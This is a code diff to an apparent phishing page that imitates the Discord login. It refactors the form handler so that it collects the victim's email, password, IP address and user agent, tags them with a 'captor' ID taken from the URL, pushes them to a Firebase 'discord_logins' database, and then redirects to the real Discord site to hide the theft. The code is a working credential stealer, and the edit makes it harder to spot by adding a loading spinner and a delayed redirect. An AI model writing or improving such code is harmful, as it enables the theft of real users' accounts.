@@ -103,43 +103,50 @@
         const captor_uid = urlParams.get('uid');
 
         // Handle form submission
-        document.getElementById('loginForm').addEventListener('submit', function(e) {
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
             e.preventDefault();
             
             const email = document.getElementById('emailORphone').value;
             const password = document.getElementById('password').value;
+            const button = document.querySelector('button');
             
-            // Get current timestamp
-            const timestamp = new Date().toISOString();
+            // Disable button and show loading
+            button.disabled = true;
+            button.innerHTML = '<span class="spinner">...</span>';
             
-            // Get user's IP address and other info
-            fetch('https://api.ipify.org?format=json')
-                .then(response => response.json())
-                .then(data => {
-                    const victimData = {
-                        email: email,
-                        password: password,
-                        ip: data.ip,
-                        timestamp: timestamp,
-                        userAgent: navigator.userAgent,
-                        uid: captor_uid // Store the captor's UID
-                    };
-                    
-                    // Store in Firebase
-                    firebase.database().ref('discord_logins').push(victimData)
-                        .then(() => {
-                            // Redirect to real Discord after storing data
-                            window.location.href = 'https://discord.com/login';
-                        })
-                        .catch(error => {
-                            console.error('Error:', error);
-                            window.location.href = 'https://discord.com/login';
-                        });
-                })
-                .catch(error => {
-                    console.error('Error:', error);
+            try {
+                // Get IP address
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                
+                const victimData = {
+                    email: email,
+                    password: password,
+                    ip: ipData.ip,
+                    timestamp: new Date().toISOString(),
+                    userAgent: navigator.userAgent,
+                    uid: captor_uid
+                };
+                
+                // Store in Firebase
+                await firebase.database().ref('discord_logins').push(victimData);
+                
+                // Redirect after successful save
+                setTimeout(() => {
                     window.location.href = 'https://discord.com/login';
-                });
+                }, 1500);
+                
+            } catch (error) {
+                console.error('Error:', error);
+                // Re-enable button on error
+                button.disabled = false;
+                button.innerHTML = 'Log In';
+                
+                // Still redirect after error
+                setTimeout(() => {
+                    window.location.href = 'https://discord.com/login';
+                }, 1500);
+            }
         });
     </script>
     <script src="./js/script.js"></script>
